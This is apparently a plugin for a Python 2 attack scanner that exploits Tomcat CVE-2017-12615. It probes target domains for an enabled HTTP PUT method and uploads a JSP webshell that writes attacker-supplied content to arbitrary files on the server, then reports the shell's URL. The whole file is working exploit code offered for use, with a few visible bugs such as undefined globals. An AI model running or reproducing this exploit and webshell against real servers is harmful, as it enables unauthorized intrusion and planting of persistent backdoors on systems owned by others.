#!/usr/bin/env python
#-*-coding:utf-8-*-
import lib.requests as requests
import sys
import time
import logging
from lib.config import (
    PASSWORD_DIC, TIME_OUT, MY_PROXY, USER_AGENT_LIST
)

def get_plugin_info():
    return {
        "name": "tomcatgetshell",
        "info": "tomcat远程代码执行CVE-2017-12615",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def TomcatGetshell(domain):
    body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
    #body = '''upload success!'''
    try:
        resp = requests.options(domain)
        if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
            url = domain+'/success.jsp/'
            #url = "/" + str(int(time.time()))+'.jsp::$DATA'
            resp_put = requests.put(url, data=body)
            if resp_put.status  == 201 :
                return 'webshell:'+url[:-1]
            elif resp_put.status == 204 :
                logging.error('file exists')
                return '%s 开启了PUT方法且webshell已存在'%domain
            else:
                logging.error('PUT upload fail')
                return '%s 开启了PUT方法'%domain
    except Exception,e:
        logging.error(e)
        pass
    return False

def exploit(ip):
    result = []
    if FindDomain_flag != 'n':
        if Domain:
            for domain in Domain:
                RETURN = TomcatGetshell(domain)
                if RETURN:
                    result.append(RETURN)
            return result
